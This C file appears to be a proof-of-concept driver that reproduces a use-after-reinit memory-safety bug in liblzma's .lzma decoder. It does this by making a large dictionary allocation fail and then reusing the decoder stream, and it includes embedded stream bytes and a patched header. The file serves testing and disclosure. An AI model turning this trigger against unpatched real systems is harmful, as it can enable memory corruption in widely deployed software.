// SPDX-License-Identifier: 0BSD
//
// Proof-of-concept driver for a use-after-reinit memory-safety defect in
// liblzma's LZMA_Alone (.lzma) decoder.
//
// It uses only the public liblzma API (<lzma.h>) with in-contract input:
//   * a custom lzma_allocator that fails large allocations (a legitimate
//     out-of-memory simulation; the same technique the project's own test
//     suite uses), and
//   * two valid .lzma streams that differ only in the dictionary-size field
//     of the header.
//
// The sequence reproduces a realistic application pattern: a single
// lzma_stream is reused for several independent .lzma streams via
// lzma_alone_decoder(). One of the streams declares an 8 MiB dictionary,
// whose buffer allocation fails under the allocator. If the decoder does not
// fully recover from that failure, the next reuse decodes into a stale
// dictionary buffer, which AddressSanitizer catches.
//
// Expected result:
//   * secure tree  -> all three decodes behave correctly, exit status 0
//   * buggy tree   -> AddressSanitizer aborts during the third decode
#include <lzma.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

// 1 MiB: the allocator refuses anything this large or larger.
#define TOO_BIG_ALLOC (1U << 20)
#define MEMLIMIT (16U << 20)

// tests/files/good-unknown_size-with_eopm.lzma: a valid .lzma stream whose
// header requests a 4 KiB dictionary (bytes 1..4 = 00 10 00 00).
static const unsigned char lzma_stream_bytes[] = {
	0x5d, 0x00, 0x10, 0x00, 0x00, 0xff, 0xff, 0xff,
	0xff, 0xff, 0xff, 0xff, 0xff, 0x00, 0x24, 0x19,
	0x49, 0x98, 0x6f, 0x05, 0x15, 0x27, 0x27, 0x0d,
	0x76, 0x78, 0xd0, 0x2a, 0x68, 0x17, 0x15, 0xff,
	0xff, 0x75, 0xf8, 0x00, 0x00
};

static void *
my_alloc(void *opaque, size_t nmemb, size_t size)
{
	(void)opaque;
	(void)nmemb;

	if (size >= TOO_BIG_ALLOC)
		return NULL;

	return malloc(size);
}

static lzma_allocator my_allocator = { &my_alloc, NULL, NULL };

static lzma_ret
decode_once(lzma_stream *strm, const unsigned char *in, size_t in_size)
{
	unsigned char out[256];

	if (lzma_alone_decoder(strm, MEMLIMIT) != LZMA_OK) {
		fprintf(stderr, "alone_decoder init failed\n");
		exit(2);
	}

	strm->next_in = in;
	strm->avail_in = in_size;
	strm->next_out = out;
	strm->avail_out = sizeof(out);

	return lzma_code(strm, LZMA_FINISH);
}

int
main(void)
{
	const size_t n = sizeof(lzma_stream_bytes);

	// Small-dictionary (4 KiB) stream: a verbatim copy of the file.
	unsigned char *small = malloc(n);
	memcpy(small, lzma_stream_bytes, n);

	// Big-dictionary (8 MiB) stream: identical except the dictionary-size
	// field is bumped so that its buffer allocation exceeds TOO_BIG_ALLOC.
	unsigned char *big = malloc(n);
	memcpy(big, lzma_stream_bytes, n);
	big[2] = 0x00;
	big[3] = 0x80;

	lzma_stream strm = LZMA_STREAM_INIT;
	strm.allocator = &my_allocator;

	lzma_ret r1 = decode_once(&strm, small, n);
	fprintf(stderr, "decode 1 (small): %d\n", (int)r1);

	lzma_ret r2 = decode_once(&strm, big, n);
	fprintf(stderr, "decode 2 (big, expect MEM_ERROR): %d\n", (int)r2);

	lzma_ret r3 = decode_once(&strm, small, n);
	fprintf(stderr, "decode 3 (small, reuse): %d\n", (int)r3);

	lzma_end(&strm);

	free(small);
	free(big);
	return 0;
}
